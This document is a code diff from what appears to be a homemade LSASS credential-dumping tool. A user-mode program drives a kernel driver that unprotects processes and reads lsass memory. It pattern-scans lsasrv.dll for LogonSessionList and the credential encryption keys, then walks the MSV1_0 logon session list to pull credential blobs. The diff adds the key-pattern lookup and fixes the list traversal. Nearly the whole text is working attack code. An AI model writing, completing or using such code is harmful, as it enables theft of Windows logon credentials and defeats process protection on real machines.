@@ -55,7 +55,10 @@ namespace driver {
 		constexpr ULONG extract = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
 
 	}
-
+	struct Patterns {
+		PVOID pLogonSessionListPattern;
+		PVOID pKeysPattern;
+	};
 	struct Request {
 		HANDLE hPID; //
 		PVOID pTargetMemory; //victim process
@@ -65,8 +68,9 @@ namespace driver {
 		PVOID pBase;
 		PVOID pEnd;
 		//ULONG_PTR offset; //FIND ITS IN DRIVER BUT CANT PASS TO USERMODE?
-		PVOID pattern;
+		Patterns Patterns;
 	};
+
 
 	bool attachToProcess(const DWORD PID, HANDLE hDriver) {
 		Request req;
@@ -97,7 +101,7 @@ namespace driver {
 		return DeviceIoControl(hDriver, codes::unprotect, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
 	}
 
-	PVOID findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {
+	Patterns findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {
 		Request req;
 		req.pBase = pBase;
 		req.pEnd = pEnd;
@@ -105,13 +109,13 @@ namespace driver {
 		printf("Base: 0x%p\n", req.pBase);
 		printf("End : 0x%p\n", req.pEnd);
 
-		req.pattern = NULL;
+		req.Patterns = { 0 };
 		DeviceIoControl(hDriver, codes::lssl, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
-		if (req.pattern == NULL) {
+		if (req.Patterns.pKeysPattern == NULL || req.Patterns.pLogonSessionListPattern == NULL) {
 			printf("DeviceIoControl error getting pLssl,,.,.\n");
 		}
-		printf("Pattern @ 0x%p\n", req.pattern);
-		return req.pattern;
+		printf("Pattern LogonSessionList @ 0x%p\nPattern Keys @ 0x%p\n", req.Patterns.pLogonSessionListPattern, req.Patterns.pKeysPattern);
+		return req.Patterns;
 	}
 	bool extract(HANDLE hDriver, PVOID pBase) {
 		Request req;
@@ -310,9 +314,14 @@ typedef struct _LSA_LOGON_SESSION {
 
 
 
+
 void decryptBlob(HANDLE hTarget) {
 
 }
+
+
+
+
 void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {
 
 	// Step 1: read the head pointer (points into LSASS memory)
@@ -328,7 +337,6 @@ void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {
 		printf("[-] Failed to read head struct\n");
 		return;
 	}
-
 	// Step 3: iterate the linked list
 	PKIWI_MSV1_0_LIST_63 current = head.Flink;
 	while (current && current != headPtr) {
@@ -370,6 +378,7 @@ void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {
 		else {
 			printf("Error reading Credentials struct");
 		}
+		current = node.Flink;
 	}
 }
 
@@ -509,10 +518,17 @@ int main(int argc, wchar_t* argv[]) {
 	if (!ReadProcessMemory(hTarget, pLsasrv, &hLsasrv, sizeof(HMODULE), &sLsasrv)) {
 		printf("Error reading lsasrv.dll from lsass...\n");
 	}
+
 	PVOID pLsl = NULL;
+	PVOID pKeysBase = NULL;
 	PVOID pEnd = (BYTE*)pLsasrv + (SIZE_T)uSize;
 
-	pLsl = (BYTE*)driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
+	//pLsl = (BYTE*)driver::findLogonSessionList(hDriver, pLsasrv, pEnd).pLogonSessionListPattern; //returns the pattern struct , throwing straight into pvoid
+	
+	driver::Patterns bytePatterns = { 0 };
+	bytePatterns = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
+	pLsl = bytePatterns.pLogonSessionListPattern;
+	pKeysBase = bytePatterns.pKeysPattern;
 
 	// JE instruction lives at offset +0x14
 	PVOID pLslActual = (PVOID)((BYTE*)pLsl + 0x14); //offset to 00007ffd`fc17e398 488d0d915b1200  lea     rcx,[lsasrv!LogonSessionList (00007ffd`fc2a3f30)] lea instruction to retr address
@@ -542,9 +558,18 @@ int main(int argc, wchar_t* argv[]) {
 	PVOID pLogonSessionList = (PVOID)(uintptr_t)target;
 
 	userlandExtraction(hTarget, (PVOID)pLogonSessionList);
+
+	wchar_t blob[0x1B0] = { 0 };
 	getSecurityBlob(hTarget, (PVOID)pLogonSessionList);
 
 	getchar();
+
+	printf("\nKeys Base: 0x%p\n", pKeysBase);
+	//now that we have keys base, extract Keys
+
+	getchar();
+
+
 	std::cout << "Hello world\n";
 
 	return 0;
